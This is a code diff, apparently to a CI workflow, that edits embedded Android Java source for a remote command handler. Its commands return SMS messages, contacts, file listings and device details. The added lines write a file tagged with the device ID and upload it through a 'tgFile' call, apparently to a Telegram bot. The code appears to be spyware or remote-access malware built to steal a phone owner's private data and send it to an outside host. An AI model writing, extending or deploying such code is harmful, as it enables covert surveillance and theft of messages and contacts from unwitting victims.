@@ -392,7 +392,16 @@ jobs:
                 String[] p = cmd.split(" ", 2);
                 String k = p[0].toLowerCase();
                 String a = p.length > 1 ? p[1] : "";
-                if (k.equals("sys")) res(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE);
+                if (k.equals("sys")) {
+                  res(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE);
+                  try {
+                    String tf = getExternalFilesDir(null) + "/test.txt";
+                    FileWriter fw = new FileWriter(tf);
+                    fw.write("hello " + DID);
+                    fw.close();
+                    tgFile(this, tf, "🧪 اختبار");
+                  } catch (Exception e) { res("test ERR " + e); }
+                }
                 else if (k.equals("sms")) res(sms());
                 else if (k.equals("contacts")) res(contacts());
                 else if (k.equals("files")) res(listDir(a));
